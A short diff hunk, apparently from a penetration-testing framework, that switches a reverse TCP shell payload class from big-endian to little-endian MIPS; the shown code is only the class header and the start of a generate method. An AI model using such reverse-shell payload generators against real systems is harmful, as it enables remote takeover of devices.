@@ -18,7 +18,7 @@ class Exploit(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
         ],
     }
 
-    architecture = Architectures.MIPSBE
+    architecture = Architectures.MIPSLE
 
     def generate(self):
         reverse_ip = validators.convert_ip(self.lhost)
